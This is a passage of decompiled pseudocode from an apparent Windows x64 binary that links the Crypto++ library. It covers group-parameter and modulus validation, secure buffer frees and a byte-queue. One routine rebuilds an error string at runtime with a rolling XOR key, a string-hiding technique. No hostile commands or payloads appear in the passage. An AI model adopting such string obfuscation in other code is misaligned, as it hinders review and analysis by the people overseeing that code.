    dword_1400DAB9C = HIWORD(dword_1400DAB9C) + 18000 * (unsigned __int16)dword_1400DAB9C;
    v5 = (((unsigned int)dword_1400DAB94 >> 13) ^ 32 * dword_1400DAB94 ^ dword_1400DAB94) + v4;
    dword_1400DAB94 ^= ((unsigned int)dword_1400DAB94 >> 13) ^ 32 * (dword_1400DAB94 ^ (dword_1400DAB94 << 12));
    byte_1400DABA0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DABA4 = v1 | 2;
    byte_1400DABA8[0] = v5 ^ 0x43;
    byte_1400DABA9 = (v5 - 1) ^ 0x72;
    byte_1400DABAA = (v5 - 2) ^ 0x79;
    byte_1400DABAB = (v5 - 3) ^ 0x70;
    byte_1400DABAC = (v5 - 4) ^ 0x74;
    byte_1400DABAD = (v5 - 5) ^ 0x6F;
    byte_1400DABAE = (v5 - 6) ^ 0x50;
    byte_1400DABAF = (v5 - 7) ^ 0x50;
    byte_1400DABB0 = (v5 - 8) ^ 0x3A;
    byte_1400DABB1 = (v5 - 9) ^ 0x20;
    byte_1400DABB2 = (v5 - 10) ^ 0x69;
    byte_1400DABB3 = (v5 - 11) ^ 0x6E;
    byte_1400DABB4 = (v5 - 12) ^ 0x76;
    byte_1400DABB5 = (v5 - 13) ^ 0x61;
    byte_1400DABB6 = (v5 - 14) ^ 0x6C;
    byte_1400DABB7 = (v5 - 15) ^ 0x69;
    byte_1400DABB8 = (v5 - 16) ^ 0x64;
    byte_1400DABB9 = (v5 - 17) ^ 0x20;
    byte_1400DABBA = (v5 - 18) ^ 0x67;
    byte_1400DABBB = (v5 - 19) ^ 0x72;
    byte_1400DABBC = (v5 - 20) ^ 0x6F;
    byte_1400DABBD = (v5 - 21) ^ 0x75;
    byte_1400DABBE = (v5 - 22) ^ 0x70;
    byte_1400DABBF = (v5 - 23) ^ 0x20;
    byte_1400DABC0 = (v5 - 24) ^ 0x65;
    byte_1400DABC1 = (v5 - 25) ^ 0x6C;
    byte_1400DABC2 = (v5 - 26) ^ 0x65;
    byte_1400DABC3 = (v5 - 27) ^ 0x6D;
    byte_1400DABC4 = (v5 - 28) ^ 0x65;
    byte_1400DABC5 = (v5 - 29) ^ 0x6E;
    byte_1400DABC6 = (v5 - 30) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x1Fui64 )
  {
    sub_140004790(Src, 0x1Fui64, 0i64);
    v5 = byte_1400DABA0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  *((_DWORD *)v6 + 6) = 0;
  *((_WORD *)v6 + 14) = 0;
  *((_BYTE *)v6 + 30) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 31i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 31) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DABA8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x1F );
  return v3;
}
// 1400DAB90: using guessed type int dword_1400DAB90;
// 1400DAB94: using guessed type int dword_1400DAB94;
// 1400DAB98: using guessed type int dword_1400DAB98;
// 1400DAB9C: using guessed type int dword_1400DAB9C;
// 1400DABA0: using guessed type char byte_1400DABA0;
// 1400DABA4: using guessed type int dword_1400DABA4;
// 1400DABA9: using guessed type char byte_1400DABA9;
// 1400DABAA: using guessed type char byte_1400DABAA;
// 1400DABAB: using guessed type char byte_1400DABAB;
// 1400DABAC: using guessed type char byte_1400DABAC;
// 1400DABAD: using guessed type char byte_1400DABAD;
// 1400DABAE: using guessed type char byte_1400DABAE;
// 1400DABAF: using guessed type char byte_1400DABAF;
// 1400DABB0: using guessed type char byte_1400DABB0;
// 1400DABB1: using guessed type char byte_1400DABB1;
// 1400DABB2: using guessed type char byte_1400DABB2;
// 1400DABB3: using guessed type char byte_1400DABB3;
// 1400DABB4: using guessed type char byte_1400DABB4;
// 1400DABB5: using guessed type char byte_1400DABB5;
// 1400DABB6: using guessed type char byte_1400DABB6;
// 1400DABB7: using guessed type char byte_1400DABB7;
// 1400DABB8: using guessed type char byte_1400DABB8;
// 1400DABB9: using guessed type char byte_1400DABB9;
// 1400DABBA: using guessed type char byte_1400DABBA;
// 1400DABBB: using guessed type char byte_1400DABBB;
// 1400DABBC: using guessed type char byte_1400DABBC;
// 1400DABBD: using guessed type char byte_1400DABBD;
// 1400DABBE: using guessed type char byte_1400DABBE;
// 1400DABBF: using guessed type char byte_1400DABBF;
// 1400DABC0: using guessed type char byte_1400DABC0;
// 1400DABC1: using guessed type char byte_1400DABC1;
// 1400DABC2: using guessed type char byte_1400DABC2;
// 1400DABC3: using guessed type char byte_1400DABC3;
// 1400DABC4: using guessed type char byte_1400DABC4;
// 1400DABC5: using guessed type char byte_1400DABC5;
// 1400DABC6: using guessed type char byte_1400DABC6;

//----- (0000000140055D10) ----------------------------------------------------
__int64 __fastcall sub_140055D10(__int64 a1, __int64 a2)
{
  __int64 v2; // rbp
  __int64 v3; // rsi
  __int64 v4; // rax
  int v5; // edi
  int v6; // eax
  int v7; // eax
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rdi
  void *v11; // rdx
  void *v12; // rdx
  void *v13; // rdx
  char v15; // [rsp+30h] [rbp-88h]
  __int64 v16; // [rsp+40h] [rbp-78h]
  void *v17; // [rsp+48h] [rbp-70h]
  char v18; // [rsp+58h] [rbp-60h]
  __int64 v19; // [rsp+68h] [rbp-50h]
  void *Memory; // [rsp+70h] [rbp-48h]
  char v21; // [rsp+80h] [rbp-38h]
  __int64 v22; // [rsp+90h] [rbp-28h]
  void *v23; // [rsp+98h] [rbp-20h]

  v2 = a2;
  v3 = a1;
  sub_14003C0E0((__int64)&v15, 1);
  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v3 - 8) + 32i64))(v3 - 8);
  v5 = sub_140045340(v4);
  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v3 - 8) + 48i64))(v3 - 8);
  v7 = sub_14005B860(v6 * v5);
  v8 = sub_14004A6C0(&v21, (unsigned int)(2 * v7));
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 64i64))(v3);
  v10 = sub_140024710((__int64)&v18, v9, (__int64)&v15);
  if ( (signed int)sub_140045A60(v8, v10) < 0 )
    v10 = v8;
  sub_14003C000(v2, v10);
  v11 = Memory;
  memset(Memory, 0, 8 * v19);
  free(v11);
  v12 = v23;
  memset(v23, 0, 8 * v22);
  free(v12);
  v13 = v17;
  memset(v17, 0, 8 * v16);
  free(v13);
  return v2;
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);

//----- (0000000140055E50) ----------------------------------------------------
char __fastcall sub_140055E50(__int64 a1, const char *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rbx
  _QWORD *v5; // rax
  char v6; // al
  __int64 v7; // rax
  __int64 v9; // [rsp+30h] [rbp-38h]
  __int64 v10; // [rsp+38h] [rbp-30h]
  __int64 v11; // [rsp+40h] [rbp-28h]
  void *Src; // [rsp+48h] [rbp-20h]
  char v13; // [rsp+50h] [rbp-18h]
  char v14; // [rsp+51h] [rbp-17h]

  v4 = 0i64;
  sub_140054F40((__int64)&v9, a1 - 80, a2, a3, a4, 0i64);
  if ( v14 )
  {
    v5 = sub_140004CA0(Src, "Modulus", 7ui64);
    sub_140004CA0(v5, &unk_1400AB2F0, 1ui64);
  }
  if ( !v13 )
  {
    while ( 1 )
    {
      v6 = aModulus[v4++];
      if ( v6 != *(_BYTE *)(v10 + v4 - 1) )
        break;
      if ( v4 == 8 )
      {
        sub_1400293A0("Modulus", (__int64)&CryptoPP::cls_097 `RTTI Type Descriptor', v11);
        v7 = sub_140055250(**(signed int **)(v9 + 16) + v9 + 8);
        sub_14003C670((__int64)Src, v7);
        return 1;
      }
    }
  }
  return v13;
}

//----- (0000000140055F30) ----------------------------------------------------
void __fastcall sub_140055F30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 v5; // rbx
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rdi
  void *v9; // rdx
  void *v10; // rdx
  void *v11; // rdx
  __int64 (__fastcall **v12)(void *); // [rsp+40h] [rbp-98h]
  __int64 (__fastcall **v13)(); // [rsp+48h] [rbp-90h]
  __int64 (__fastcall ***v14)(void *); // [rsp+50h] [rbp-88h]
  char v15; // [rsp+58h] [rbp-80h]
  __int64 v16; // [rsp+68h] [rbp-70h]
  void *v17; // [rsp+70h] [rbp-68h]
  char v18; // [rsp+80h] [rbp-58h]
  __int64 v19; // [rsp+90h] [rbp-48h]
  void *v20; // [rsp+98h] [rbp-40h]
  char v21; // [rsp+A8h] [rbp-30h]
  __int64 v22; // [rsp+B8h] [rbp-20h]
  void *Memory; // [rsp+C0h] [rbp-18h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (**)(void))(*(_QWORD *)(a1 - 8) + 32i64))();
  v13 = &off_1400A64C0;
  v14 = &v12;
  v12 = &off_1400A6528;
  sub_14003C000((__int64)&v15, v8);
  sub_14003BE30((__int64)&v18, 0i64, *(_QWORD *)(v8 + 16));
  sub_14003C210(&v21);
  sub_14004B7E0((__int64)&v12, v7, v6, v5, a5);
  v9 = Memory;
  memset(Memory, 0, 8 * v22);
  free(v9);
  v10 = v20;
  memset(v20, 0, 8 * v19);
  free(v10);
  v11 = v17;
  memset(v17, 0, 8 * v16);
  free(v11);
}
// 1400A64C0: using guessed type __int64 (__fastcall *off_1400A64C0)();
// 1400A6528: using guessed type __int64 (__fastcall *off_1400A6528)(void *);

//----- (0000000140056050) ----------------------------------------------------
char __fastcall sub_140056050(__int64 *a1, unsigned int a2, __int64 a3, __int64 *a4)
{
  __int64 *v4; // r13
  __int64 v5; // r15
  __int64 *v6; // r14
  char v7; // bl
  __int64 v8; // rsi
  bool v9; // si
  unsigned int v10; // eax
  __int64 v11; // rbx
  __int64 v12; // rdi
  __int64 v13; // rax
  __int64 v14; // rax
  void *v15; // rdx
  __int64 v16; // rax
  __int64 v17; // rax
  void *v18; // rdx
  void *v19; // rdx
  void *v20; // rdx
  __int64 v21; // rax
  __int64 v22; // rdi
  __int64 v23; // rax
  __int64 v24; // rax
  char v25; // bl
  void *v26; // rdx
  void *v27; // rdx
  bool v28; // bl
  void *v29; // rdx
  int v30; // eax
  __int64 v32; // [rsp+20h] [rbp-69h]
  __int64 v33; // [rsp+28h] [rbp-61h]
  char v34; // [rsp+30h] [rbp-59h]
  __int64 v35; // [rsp+40h] [rbp-49h]
  void *Memory; // [rsp+48h] [rbp-41h]
  char v37; // [rsp+58h] [rbp-31h]
  __int64 v38; // [rsp+68h] [rbp-21h]
  void *v39; // [rsp+70h] [rbp-19h]
  char v40; // [rsp+80h] [rbp-9h]
  __int64 v41; // [rsp+90h] [rbp+7h]
  void *v42; // [rsp+98h] [rbp+Fh]
  __int64 v43; // [rsp+A8h] [rbp+1Fh]
  unsigned int v44; // [rsp+F8h] [rbp+6Fh]

  v44 = a2;
  v43 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a1;
  v7 = 0;
  v8 = (*(__int64 (__fastcall **)(__int64 *))(*(a1 - 1) + 32))(a1 - 1);
  v33 = v8;
  v32 = (*(__int64 (__fastcall **)(__int64 *))(*v6 + 64))(v6);
  if ( (*(unsigned int (__fastcall **)(__int64 *))(*(v6 - 1) + 48))(v6 - 1) == 1 )
  {
    if ( *(_DWORD *)(v5 + 32) == 1 || sub_14003CDA0(v5) )
      goto LABEL_9;
  }
  else if ( *(_DWORD *)(v5 + 32) == 1 )
  {
    goto LABEL_9;
  }
  if ( (signed int)sub_140045A60(v5, v8) < 0
    && !(*(unsigned __int8 (__fastcall **)(__int64 *, __int64))(*v6 + 152))(v6, v5) )
  {
    v9 = 1;
    goto LABEL_10;
  }
LABEL_9:
  v9 = 0;
LABEL_10:
  v10 = v44;
  if ( v44 >= 1 && v4 )
  {
    v9 = v9
      && (v11 = *v4,
          v12 = sub_140049E30(),
          v13 = (*(__int64 (__fastcall **)(__int64 *))(*v6 + 40))(v6),
          v14 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64, __int64))(v11 + 48))(v4, &v34, v13, v12),
          v7 = 1,
          !(unsigned int)sub_140045A60(v14, v5));
    if ( v7 & 1 )
    {
      v7 &= 0xFEu;
      v15 = Memory;
      memset(Memory, 0, 8 * v35);
      free(v15);
    }
    v10 = v44;
  }
  if ( v10 < 2 )
    goto LABEL_51;
  if ( (*(unsigned int (__fastcall **)(__int64 *))(*(v6 - 1) + 48))(v6 - 1) == 2 )
  {
    v9 = v9
      && (sub_14003C0E0((__int64)&v34, 4),
          v16 = sub_1400246E0((__int64)&v37, v5),
          v17 = sub_140024710((__int64)&v40, v16, (__int64)&v34),
          v7 |= 0xEu,
          (unsigned int)sub_14005DC30(v17, v33) == -1);
    if ( v7 & 8 )
    {
      v7 &= 0xF7u;
      v18 = v42;
      memset(v42, 0, 8 * v41);
      free(v18);
    }
    if ( v7 & 4 )
    {
      v7 &= 0xFBu;
      v19 = v39;
      memset(v39, 0, 8 * v38);
      free(v19);
    }
    if ( v7 & 2 )
    {
      v7 &= 0xFDu;
      v20 = Memory;
      memset(Memory, 0, 8 * v35);
      free(v20);
    }
  }
  if ( ((*(unsigned int (__fastcall **)(__int64 *))(*(v6 - 1) + 48))(v6 - 1) == 2 && v44 >= 3
     || !(*(unsigned __int8 (__fastcall **)(__int64 *))(*v6 + 144))(v6))
    && v9 )
  {
    v21 = *v6;
    if ( v4 )
    {
      v22 = *v4;
      v23 = (*(__int64 (__fastcall **)(__int64 *))(v21 + 40))(v6);
      v24 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64, __int64))(v22 + 48))(v4, &v40, v23, v32);
      v25 = v7 | 0x10;
    }
    else
    {
      v24 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64, __int64))(v21 + 32))(v6, &v37, v5, v32);
      v25 = v7 | 0x20;
    }
    sub_14003C000((__int64)&v34, v24);
    if ( v25 & 0x20 )
    {
      v25 &= 0xDFu;
      v26 = v39;
      memset(v39, 0, 8 * v38);
      free(v26);
    }
    if ( v25 & 0x10 )
    {
      v27 = v42;
      memset(v42, 0, 8 * v41);
      free(v27);
    }
    v28 = (*(unsigned __int8 (__fastcall **)(__int64 *, char *))(*v6 + 152))(v6, &v34) != 0;
    v29 = Memory;
    memset(Memory, 0, 8 * v35);
    free(v29);
    LOBYTE(v30) = v28;
    return v30;
  }
  if ( (*(unsigned int (__fastcall **)(__int64 *))(*(v6 - 1) + 48))(v6 - 1) != 1 )
  {
LABEL_51:
    LOBYTE(v30) = v9;
    return v30;
  }
  if ( !v9 || (v30 = sub_14005DC30(v5, v33), v30 != 1) )
    LOBYTE(v30) = 0;
  return v30;
}
// 14005DC30: using guessed type __int64 __fastcall sub_14005DC30(_QWORD, _QWORD);

//----- (00000001400563A0) ----------------------------------------------------
char __fastcall sub_1400563A0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // ebp
  __int64 v4; // r13
  __int64 v5; // r15
  char v6; // bl
  __int64 v7; // r12
  __int64 v8; // r14
  __int64 v9; // rax
  __int64 v10; // rax
  bool v11; // si
  __int64 v12; // rdi
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rdi
  __int64 v16; // rax
  void *v17; // rdx
  void *v18; // rdx
  void *v19; // rdx
  char v21; // [rsp+28h] [rbp-A0h]
  __int64 v22; // [rsp+38h] [rbp-90h]
  void *Memory; // [rsp+40h] [rbp-88h]
  char v24; // [rsp+50h] [rbp-78h]
  __int64 v25; // [rsp+60h] [rbp-68h]
  void *v26; // [rsp+68h] [rbp-60h]
  char v27; // [rsp+78h] [rbp-50h]
  __int64 v28; // [rsp+88h] [rbp-40h]
  void *v29; // [rsp+90h] [rbp-38h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = 0;
  v7 = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)(a1 - 8) + 32i64))(a1 - 8);
  v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 64i64))(v5);
  v9 = sub_140049E30();
  v11 = 0;
  if ( (signed int)sub_140045A60(v7, v9) > 0 && sub_140048010(v7, 0i64) == 1 )
  {
    v10 = sub_140049E30();
    if ( (signed int)sub_140045A60(v8, v10) > 0 && sub_140048010(v8, 0i64) == 1 )
      v11 = 1;
  }
  if ( v3 >= 1 )
  {
    v11 = v11
       && (v12 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v5 + 88i64))(v5, &v27),
           v6 = 1,
           v13 = sub_140049E30(),
           (signed int)sub_140045A60(v12, v13) > 0)
       && (v14 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v5 + 80i64))(v5, &v24),
           v15 = sub_1400247D0((__int64)&v21, v14),
           v6 = 7,
           v16 = sub_14004C270(),
           !(unsigned int)sub_140045A60(v15, v16));
    if ( v6 & 4 )
    {
      v6 &= 0xFBu;
      v17 = Memory;
      memset(Memory, 0, 8 * v22);
      free(v17);
    }
    if ( v6 & 2 )
    {
      v6 &= 0xFDu;
      v18 = v26;
      memset(v26, 0, 8 * v25);
      free(v18);
    }
    if ( v6 & 1 )
    {
      v19 = v29;
      memset(v29, 0, 8 * v28);
      free(v19);
    }
  }
  if ( v3 < 2 )
    return v11;
  if ( v11 && sub_14005E980(v4, v8, v3 - 2) && sub_14005E980(v4, v7, v3 - 2) )
    return 1;
  return 0;
}

//----- (00000001400565B0) ----------------------------------------------------
__int64 __fastcall sub_1400565B0(__int64 a1, signed __int64 a2)
{
  signed __int64 v2; // rbx
  __int64 v3; // rdi
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  unsigned __int64 v6; // rsi
  void *v7; // rax

  v2 = a2;
  v3 = a1;
  sub_140036DA0(a1, 0);
  *(_QWORD *)v3 = &off_1400AB968;
  *(_QWORD *)(v3 + 8) = off_1400ABAC8;
  *(_QWORD *)(v3 + 40) = 0i64;
  *(_QWORD *)(v3 + 48) = 0i64;
  *(_QWORD *)(v3 + 56) = 0i64;
  *(_QWORD *)(v3 + 64) = 0i64;
  *(_BYTE *)(v3 + 72) = 0;
  *(_BYTE *)(v3 + 24) = v2 == 0;
  if ( !v2 )
    v2 = 256i64;
  *(_QWORD *)(v3 + 32) = v2;
  v4 = operator new(0x30ui64);
  v5 = v4;
  if ( v4 )
  {
    v6 = *(_QWORD *)(v3 + 32);
    v4[2] = v6;
    sub_1400255A0(v6);
    if ( v6 )
      v7 = sub_14003A000(v6);
    else
      v7 = 0i64;
    v5[3] = v7;
    v5[5] = 0i64;
    v5[4] = 0i64;
    *v5 = 0i64;
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)(v3 + 48) = v5;
  *(_QWORD *)(v3 + 40) = v5;
  return v3;
}
// 1400AB968: using guessed type __int64 (__fastcall *off_1400AB968)(void *);
// 1400ABAC8: using guessed type __int64 (__fastcall *off_1400ABAC8[3])();

//----- (0000000140056690) ----------------------------------------------------
_QWORD *__fastcall sub_140056690(_QWORD *a1, unsigned __int64 a2)
{
  _QWORD *v2; // rbx
  size_t v3; // rdi
  void *v4; // rax

  v2 = a1;
  a1[2] = a2;
  v3 = a2;
  sub_1400255A0(a2);
  if ( v3 )
    v4 = sub_14003A000(v3);
  else
    v4 = 0i64;
  v2[3] = v4;
  v2[5] = 0i64;
  v2[4] = 0i64;
  *v2 = 0i64;
  return v2;
}

//----- (00000001400566F0) ----------------------------------------------------
void __fastcall sub_1400566F0(_QWORD *a1)
{
  void *v1; // rbx
  void *v2; // rdx
  void *v3; // rsi

  v1 = (void *)a1[5];
  *a1 = &off_1400AB968;
  a1[1] = off_1400ABAC8;
  if ( v1 )
  {
    do
    {
      v2 = (void *)*((_QWORD *)v1 + 3);
      v3 = *(void **)v1;
      memset(*((void **)v1 + 3), 0, *((_QWORD *)v1 + 2));
      free(v2);
      operator delete(v1);
      v1 = v3;
    }
    while ( v3 );
  }
}
// 1400AB968: using guessed type __int64 (__fastcall *off_1400AB968)(void *);
// 1400ABAC8: using guessed type __int64 (__fastcall *off_1400ABAC8[3])();

//----- (000000014005675C) ----------------------------------------------------
void *__fastcall sub_14005675C(__int64 a1, char a2)
{
  return sub_140056770((void *)(a1 - 8), a2);
}

//----- (0000000140056770) ----------------------------------------------------
void *__fastcall sub_140056770(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400566F0(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (00000001400567A0) ----------------------------------------------------
void __fastcall sub_1400567A0(__int64 a1)
{
  __int64 v1; // rsi
  void *v2; // rbx
  void *v3; // rdx
  __int64 v4; // rcx

  v1 = a1;
  while ( *(_QWORD *)(v1 + 40) )
  {
    v2 = *(void **)(v1 + 40);
    if ( v2 == *(void **)(v1 + 48) || *((_QWORD *)v2 + 4) != *((_QWORD *)v2 + 2) )
      break;
    *(_QWORD *)(v1 + 40) = *(_QWORD *)v2;
    if ( v2 )
    {
      v3 = (void *)*((_QWORD *)v2 + 3);
      memset(*((void **)v2 + 3), 0, *((_QWORD *)v2 + 2));
      free(v3);
      operator delete(v2);
    }
  }
  v4 = *(_QWORD *)(v1 + 40);
  if ( v4 )
  {
    if ( *(_QWORD *)(v4 + 40) == *(_QWORD *)(v4 + 32) )
    {
      *(_QWORD *)(v4 + 40) = 0i64;
      *(_QWORD *)(v4 + 32) = 0i64;
    }
  }
}

//----- (0000000140056840) ----------------------------------------------------
_QWORD *__fastcall sub_140056840(__int64 a1)
{
  _QWORD *v1; // rbp
  void *v2; // rbx
  void *v3; // rdx
  void *v4; // rsi
  __int64 v5; // rax
  _QWORD *result; // rax

  v1 = (_QWORD *)a1;
  v2 = **(void ***)(a1 + 40);
  if ( v2 )
  {
    do
    {
      v3 = (void *)*((_QWORD *)v2 + 3);
      v4 = *(void **)v2;
      memset(*((void **)v2 + 3), 0, *((_QWORD *)v2 + 2));
      free(v3);
      operator delete(v2);
      v2 = v4;
    }
    while ( v4 );
  }
  v5 = v1[5];
  v1[6] = v5;
  *(_QWORD *)(v5 + 40) = 0i64;
  *(_QWORD *)(v5 + 32) = 0i64;
  result = (_QWORD *)v1[5];
  *result = 0i64;
  v1[8] = 0i64;
  return result;
}

//----- (00000001400568D0) ----------------------------------------------------
__int64 __fastcall sub_1400568D0(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6)
{
  __int64 v6; // rbx
  __int64 v7; // rbp
  __int64 v8; // rsi
  __int64 *v9; // r14
  __int64 result; // rax
  __int64 v11; // [rsp+30h] [rbp-98h]
  __int64 (__fastcall **v12)(); // [rsp+40h] [rbp-88h]
  __int64 (__fastcall **v13)(); // [rsp+48h] [rbp-80h]
  __int64 v14; // [rsp+58h] [rbp-70h]
  __int64 v15; // [rsp+60h] [rbp-68h]
  __int64 v16; // [rsp+68h] [rbp-60h]
  __int64 v17; // [rsp+70h] [rbp-58h]
  __int64 v18; // [rsp+78h] [rbp-50h]
  __int64 v19; // [rsp+80h] [rbp-48h]

  v6 = a1;
  v7 = a2;
  v8 = a4;
  v9 = a3;
  sub_140036DA0((__int64)&v12, 0);
  v12 = &off_1400AB808;
  v14 = v6;
  v13 = off_1400A9A98;
  v15 = 0i64;
  v16 = 0i64;
  v17 = 0i64;
  v18 = 0i64;
  v19 = 0i64;
  sub_140038B00((__int64)&v12);
  sub_1400392F0((__int64)&v12, *v9);
  v11 = v8 - *v9;
  result = sub_140057440((__int64)&v12, v7, (unsigned __int64 *)&v11, a5, a6);
  *v9 += v11;
  return result;
}
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AB808: using guessed type __int64 (__fastcall *off_1400AB808)();
// 1400DA7A8: using guessed type __int64 qword_1400DA7A8;

//----- (00000001400569C0) ----------------------------------------------------
__int64 __fastcall sub_1400569C0(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, __int64 a5, char a6)
{
  __int64 v6; // rsi
  __int64 v7; // rdx
  __int64 v8; // rdi
  __int64 *v9; // r14
  __int64 result; // rax
  __int64 v11; // [rsp+30h] [rbp-88h]
  __int64 (__fastcall **v12)(); // [rsp+40h] [rbp-78h]
  __int64 (__fastcall **v13)(); // [rsp+48h] [rbp-70h]
  int v14; // [rsp+50h] [rbp-68h]
  __int64 v15; // [rsp+58h] [rbp-60h]
  __int64 v16; // [rsp+60h] [rbp-58h]
  __int64 v17; // [rsp+68h] [rbp-50h]
  __int64 v18; // [rsp+70h] [rbp-48h]
  __int64 v19; // [rsp+78h] [rbp-40h]
  __int64 v20; // [rsp+80h] [rbp-38h]

  v6 = a2;
  v7 = *a3;
  v14 = *(_DWORD *)(a1 + 16);
  v12 = &off_1400AB808;
  v8 = a4;
  v13 = off_1400A9A98;
  v9 = a3;
  v15 = *(_QWORD *)(a1 + 24);
  v16 = *(_QWORD *)(a1 + 32);
  v17 = *(_QWORD *)(a1 + 40);
  v18 = *(_QWORD *)(a1 + 48);
  v19 = *(_QWORD *)(a1 + 56);
  v20 = *(_QWORD *)(a1 + 64);
  sub_1400392F0((__int64)&v12, v7);
  v11 = v8 - *v9;
  result = sub_140057440((__int64)&v12, v6, (unsigned __int64 *)&v11, a5, a6);
  *v9 += v11;
  return result;
}
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AB808: using guessed type __int64 (__fastcall *off_1400AB808)();

//----- (0000000140056B70) ----------------------------------------------------
__int64 __fastcall sub_140056B70(__int64 a1)
{
  _QWORD *v1; // rax
  __int64 i; // r8
  __int64 v3; // rdx

  v1 = *(_QWORD **)(a1 + 40);
  for ( i = 0i64; v1; i += v3 )
  {
    v3 = v1[5] - v1[4];
    v1 = (_QWORD *)*v1;
  }
  return i + *(_QWORD *)(a1 + 64);
}

//----- (0000000140056BA0) ----------------------------------------------------
__int64 __fastcall sub_140056BA0(_QWORD *a1)
{
  __int64 v1; // r8
  char v2; // ST20_1
  __int64 result; // rax

  v1 = a1[8];
  a1[8] = 0i64;
  if ( v1 )
  {
    v2 = 1;
    result = (*(__int64 (__fastcall **)(_QWORD *, _QWORD, __int64, _QWORD, char))(*a1 + 40i64))(a1, a1[7], v1, 0i64, v2);
  }
  return result;
}

//----- (0000000140056BD0) ----------------------------------------------------
signed __int64 __fastcall sub_140056BD0(_QWORD *a1, _BYTE *a2)
{
  _QWORD *v2; // r9
  _QWORD *v3; // r8
  __int64 v4; // rcx
  signed __int64 v5; // rax
  signed __int64 result; // rax

  v2 = (_QWORD *)a1[5];
  v3 = a1;
  v4 = v2[4];
  if ( v2[5] == v4 )
  {
    v5 = 0i64;
  }
  else
  {
    v5 = 1i64;
    *a2 = *(_BYTE *)(v4 + v2[3]);
  }
  v2[4] += v5;
  if ( v5 )
  {
    if ( *(_QWORD *)(v3[5] + 32i64) == *(_QWORD *)(v3[5] + 16i64) )
      sub_1400567A0((__int64)v3);
    result = 1i64;
  }
  else if ( v3[8] )
  {
    result = 1i64;
    *a2 = *(_BYTE *)v3[7]++;
    --v3[8];
  }
  else
  {
    result = 0i64;
  }
  return result;
}

//----- (0000000140056C50) ----------------------------------------------------
__int64 __fastcall sub_140056C50(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // rax
  char v5; // ST20_1
  __int64 v7; // [rsp+30h] [rbp-48h]
  __int64 (__fastcall **v8)(); // [rsp+38h] [rbp-40h]
  __int64 (__fastcall **v9)(); // [rsp+40h] [rbp-38h]
  __int64 v10; // [rsp+50h] [rbp-28h]
  __int64 v11; // [rsp+58h] [rbp-20h]
  __int64 v12; // [rsp+60h] [rbp-18h]

  v2 = a1;
  v3 = a2;
  sub_140036DA0((__int64)&v8, 0);
  v8 = &off_1400A8940;
  v9 = off_1400A9A98;
  v4 = *v2;
  v10 = v3;
  v11 = 1i64;
  v12 = 0i64;
  v7 = 1i64;
  v5 = 1;
  (*(void (__fastcall **)(__int64 *, __int64 (__fastcall ***)(), __int64 *, void **, char))(v4 + 248))(
    v2,
    &v8,
    &v7,
    &qword_1400D8080,
    v5);
  return v7;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140056D00) ----------------------------------------------------
__int64 __fastcall sub_140056D00(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 *v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  char v7; // ST20_1
  __int64 v9; // [rsp+30h] [rbp-48h]
  __int64 (__fastcall **v10)(); // [rsp+38h] [rbp-40h]
  __int64 (__fastcall **v11)(); // [rsp+40h] [rbp-38h]
  __int64 v12; // [rsp+50h] [rbp-28h]
  __int64 v13; // [rsp+58h] [rbp-20h]
  __int64 v14; // [rsp+60h] [rbp-18h]

  v3 = a1;
  v4 = a2;
  v5 = a3;
  sub_140036DA0((__int64)&v10, 0);
  v10 = &off_1400A8940;
  v11 = off_1400A9A98;
  v6 = *v3;
  v12 = v4;
  v13 = v5;
  v14 = 0i64;
  v9 = v5;
  v7 = 1;
